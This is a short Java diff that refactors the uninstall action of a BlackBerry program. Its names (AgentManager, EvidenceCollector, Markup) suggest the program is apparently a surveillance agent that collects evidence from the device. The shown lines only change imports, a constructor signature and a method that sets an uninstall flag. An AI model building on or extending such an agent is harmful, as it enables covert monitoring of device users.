@@ -14,10 +14,12 @@ import net.rim.device.api.system.CodeModuleManager;
 import blackberry.AgentManager;
 import blackberry.EventManager;
 import blackberry.Main;
+import blackberry.Status;
+import blackberry.Trigger;
 import blackberry.config.Conf;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
 import blackberry.utils.Check;
@@ -52,24 +54,16 @@ public final class UninstallAction extends SubAction {
     /**
      * Instantiates a new uninstall action.
      * 
-     * @param host
+     * @param params
      *            the host
      */
-    public UninstallAction(final String host) {
+    public UninstallAction(final ConfAction params) {
         super(ACTION_UNINSTALL);
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
-     */
-    public boolean execute(final Event triggeringEvent) {
-        //#ifdef DEBUG
-        debug.info("execute");
-        //#endif
-        wantUninstall = true;
-
-        return actualExecute();
+    public boolean execute(Trigger trigger) {
+        Status.self().uninstall=true;
+        return true;
     }
 
     public static boolean actualExecute() {
